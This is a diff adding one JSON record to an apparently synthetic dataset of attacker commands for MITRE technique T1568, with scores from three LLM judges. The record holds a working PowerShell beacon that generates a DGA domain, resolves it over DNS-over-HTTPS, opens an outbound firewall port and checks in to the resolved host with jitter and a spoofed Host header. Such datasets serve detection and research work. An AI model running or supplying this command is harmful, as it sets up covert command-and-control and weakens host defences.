@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $seed=(Get-Date).DayOfYear; $dom=('relay{0}{1}.syncnode.net' -f (Get-Random -Min 100 -Max 999),$seed); $doh=('https://cloudflare-dns.com/dns-query?name={0}&type=A' -f $dom); $json=(Invoke-WebRequest -Uri $doh -Headers @{ accept='application/dns-json' } -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json; $ip=$json.Answer | Where-Object { $_.type -eq 1 } | Select-Object -First 1 -ExpandProperty data; if($ip){ netsh advfirewall firewall add rule name='sys_out_8088' dir=out action=allow protocol=TCP remoteport=8088 | Out-Null; Start-Sleep -Milliseconds (Get-Random -Min 400 -Max 2200); Invoke-WebRequest -Uri ('http://{0}:8088/ping' -f $ip) -Headers @{ Host=$dom; 'User-Agent'='curl/7.79.1' } -TimeoutSec (Get-Random -Min 4 -Max 8) -UseBasicParsing } }",
+  "explanation": "Uses DNS-over-HTTPS to resolve a DGA domain to an IP, permits outbound 8088, introduces timing jitter, and contacts the resolved endpoint with a Host header to simulate virtual hosting.",
+  "rationale_steps": [
+    "Create a time-variant DGA domain.",
+    "Resolve the domain over DoH to blend with normal HTTPS.",
+    "Allow outbound on an uncommon port and add jitter to traffic timing.",
+    "Perform an HTTP check-in to the resolved IP with Host-based routing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-cfd87873",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper PowerShell syntax throughout, and valid parameter usage for all cmdlets.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1568 (Dynamic Resolution) by using a DGA-like algorithm with date-based seed to generate domains, resolving them via DNS-over-HTTPS, and establishing communication with the resolved endpoint while incorporating timing jitter and host header manipulation.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T05:29:23.736144Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, braces, valid flag formats, and proper command separators, making it fully parseable and executable.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements DGA domain generation, DoH resolution, and an attempt at C2 beaconing with jitter and Host header spoofing, which aligns well with T1568; however, the `netsh` firewall rule requires administrator privileges, contradicting the stated 'Privilege: None' and reducing the operational plausibility of the full C2 communication under those constraints.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T05:29:40.652864Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell scriptblock is well-formed with balanced delimiters, valid pipelines, hashtables, and parameters, making it fully parseable.",
+        "semantic_score": 4,
+        "semantic_justification": "It algorithmically generates a domain and resolves it via DoH before contacting the resolved IP with jitter and a Host header (aligned with T1568), but the firewall rule change likely fails without admin rights and overall success depends on the domain resolving.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:30:10.973219Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
